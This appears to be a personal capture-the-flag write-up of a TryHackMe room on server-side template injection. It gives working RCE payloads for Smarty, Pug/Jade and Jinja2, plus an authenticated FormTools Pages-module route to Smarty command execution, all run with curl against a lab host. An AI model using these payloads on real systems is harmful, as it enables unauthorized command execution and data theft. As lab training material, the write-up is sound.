# Server-side Template Injection (TryHackMe)

Room: Server-side Template Injection — Web Application Pentesting / Injection Attacks. RCE through
four template engines: **Smarty** (PHP), **Pug/Jade** (NodeJS), **Jinja2** (Python), and a FormTools
CMS **extra-mile** that also renders Smarty. Completed: 2026-11-09 | Target: <ip>
(`SSTI.v.1.7-badr`). Solved **fully headless from `C:\CTF`** with `curl` + Python stdlib — no browser,
no SSTImap, no AttackBox. Apps are vhosts behind `ssti.thm` on separate ports; driven with a `Host:`
header against the raw IP.

## Answers

| Task | Engine / where | Answer |
|---|---|---|
| 4 | Smarty — `:8000/smarty/` hidden file | `THM{…}` |
| 5 | Pug/Jade — `:8001/jade/` hidden file | `THM{…}` |
| 6 | Jinja2 — `:8002/jinja2/` hidden file | `THM{…}` |
| 8 | Extra-mile — FormTools `:8080` hidden file | `THM{…}` |

All four apps take the payload in a single POST field named **`page`** (the guided three) or via the
FormTools admin UI (task 8). Each hidden flag lives in the app's own directory; `ls -la` first, then
`cat` the random-named `.txt`.

## Task 4 — Smarty (PHP), port 8000

`{...}` is Smarty's delimiter; `system()` is callable directly:

```bash
curl -s -H "Host: ssti.thm:8000" "http://IP:8000/smarty/" \
     --data-urlencode "page={system('ls -la')}"
# -> <redacted-hash>.txt
curl ... --data-urlencode "page={system('cat <redacted-hash>.txt')}"
# -> THM{…}
```

## Task 5 — Pug/Jade (NodeJS), port 8001

Pug interpolates JS in `#{}`; reach `child_process` off the global `process`. `spawnSync` needs the
command and args as **separate** list elements:

```bash
curl -s -H "Host: ssti.thm:8001" "http://IP:8001/jade/" --data-urlencode \
 "page=#{root.process.mainModule.require('child_process').spawnSync('ls',['-lah']).stdout}"
# -> <redacted-hash>.txt
curl ... --data-urlencode \
 "page=#{root.process.mainModule.require('child_process').spawnSync('cat',['<redacted-hash>.txt']).stdout}"
# -> THM{…}
```

## Task 6 — Jinja2 (Python), port 8002

`{{ }}` evaluates Python. Instead of the brittle `__subclasses__()[157]` index from the room, use the
**index-independent** `cycler` gadget to reach `os`:

```bash
curl -s -H "Host: ssti.thm:8002" "http://IP:8002/jinja2/" --data-urlencode \
 "page={{cycler.__init__.__globals__.os.popen('ls -la').read()}}"
# -> <redacted-hash>.txt
curl ... --data-urlencode \
 "page={{cycler.__init__.__globals__.os.popen('cat <redacted-hash>.txt').read()}}"
# -> THM{…}
```

(The dir also held `makoTemplate.py` / `server.py` — the room's Task 7 SSTImap demo targets the
`/mako/` endpoint on the same Python app; no flag attached, so not needed.)

## Task 8 — Extra-mile: FormTools Pages module → Smarty RCE, port 8080

Port 8080 is **Form Tools 3.x** (PHP; `Server: Apache/2.4.52`, `PHP/7.3.33`). The GET-/ stack trace
reveals `FormTools\...` classes. Login `admin` / `admin` POSTs to `/index.php` → `302 /admin/forms/`.

**Vector: the Pages module** (`/modules/pages/`). Its *Add Page* form has a `content_type` radio with
a built-in **`smarty`** option, and the content is rendered by Smarty when the page is viewed — a
first-party SSTI, no gadget hunting:

1. POST to `/modules/pages/edit.php` with `add_page=UPDATE`, `content_type=smarty`,
   `codemirror_content={system('...')}` (seed `wysiwyg_content` too), `access_type=admin`. Returns a
   `page_id`.
2. Render it at **`/modules/pages/view.php?page_id=N`** (not `display.php` — that 404s). The Smarty
   tag executes server-side as `www-data`.

```
{system('id; ls -la')}           -> uid=33(www-data); cwd /var/www/html/modules/pages
{system('find / -maxdepth 4 -name "*.txt" ...')}
  -> /var/www/html/<redacted-hash>.txt   (18 bytes)
{system('cat /var/www/html/<redacted-hash>.txt')}
  -> THM{…}
```

Driver: `ft_rce.py` (reuses the `ft.jar` session cookie, creates the page, auto-renders `view.php`,
greps the response for `THM{…}` / `uid=` / dir listings).

## Lessons

- **Detect before you exploit.** The room's fingerprints: `{7*7}`→`49` + `{'x'|upper}` = Smarty;
  `#{7*7}`→`49` = Pug/Jade; `{{7*7}}`→`49` vs `{{7*'7'}}` (`7777777` = Jinja2, `49` = Twig). Here the
  URLs named the engine, so I went straight to RCE.
- **`spawnSync`/`check_output` take arg **lists**, not one string.** `spawnSync('ls -lah')` fails
  (looks for an executable literally named `ls -lah`); `spawnSync('ls',['-lah'])` works. Same rule for
  Python's `check_output(['ls','-lah'])`. This is the room's deliberate gotcha.
- **Prefer index-independent Jinja2 gadgets.** `__subclasses__()[157]` depends on the exact class
  table and breaks across versions; `cycler.__init__.__globals__.os` (or `lipsum`, `request`) reaches
  `os`/`subprocess` without counting subclasses.
- **CMS "custom page" features are SSTI goldmines.** FormTools literally offers a `smarty` content
  type for admin pages — intended functionality, rendered unsandboxed → authenticated RCE. When an app
  lets privileged users author template content, that's the injection point; find the *render* URL
  (`view.php`, not the editor) to trigger it.
- **Headless vhost pattern** (cf. [[xxe-injection]], [[nosql-injection]], [[advanced-sql-injection]]):
  one IP hosting several named apps on different ports → `curl -H "Host: ssti.thm:PORT"` against the
  raw IP, a per-session cookie jar for the authenticated app, and a small Python helper to drive the
  multi-field POST + render + grep. All from `C:\CTF`.
